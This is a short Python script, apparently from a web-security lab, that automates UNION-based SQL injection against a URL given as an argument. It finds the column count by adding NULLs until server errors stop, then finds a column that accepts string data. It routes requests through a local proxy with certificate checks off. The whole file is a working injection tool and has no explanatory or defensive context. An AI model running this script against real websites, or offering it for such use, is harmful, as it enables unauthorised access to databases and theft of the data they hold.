import requests
import urllib3
import sys


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_detect_string_pos(url, numCols, randString):
    randString = "'"+randString+"'"
    for i in range(1, numCols+1):
        payload_list = ["NULL"] * numCols
        payload_list[i-1] = randString 
        payload = "' UNION SELECT " + ','.join(payload_list) + "--"
        r = requests.get(url+payload, verify=False, proxies=proxies)
        if "Internal Server Error" not in r.text:
            return i
    


def exploit_sqli(url):
    counter = 1
    payload = "NULL"
    end = "--"
    r = requests.get(url + "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
    while "Internal Server Error" in r.text:
        payload += ",NULL"
        r = requests.get(url+ "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
        counter += 1
    return counter
    


if __name__ == '__main__':
    url = sys.argv[1]
    randomString = sys.argv[2]
    numCols = exploit_sqli(url)
    position = sqli_detect_string_pos(url, numCols, randomString)
    print(numCols)
    print(position)